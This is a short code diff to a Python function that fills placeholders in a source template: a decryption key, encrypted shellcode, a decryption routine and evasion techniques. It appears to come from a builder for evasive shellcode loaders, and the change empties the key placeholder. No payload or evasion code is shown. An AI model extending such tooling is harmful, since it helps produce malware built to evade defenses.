@@ -338,7 +338,7 @@ def _write_source(template_path: str, out_path: str, obfuscated: dict) -> None:
         source = "/* Template not found */\n"
 
     replacements = {
-        "/* PLACEHOLDER: decryption_key */": obfuscated.get("encryption_code", ""),
+        "/* PLACEHOLDER: decryption_key */": "",
         "/* PLACEHOLDER: encrypted_shellcode */": "",
         "/* PLACEHOLDER: decryption_routine */": obfuscated.get("encryption_code", ""),
         "/* PLACEHOLDER: evasion_techniques */": "\n".join([
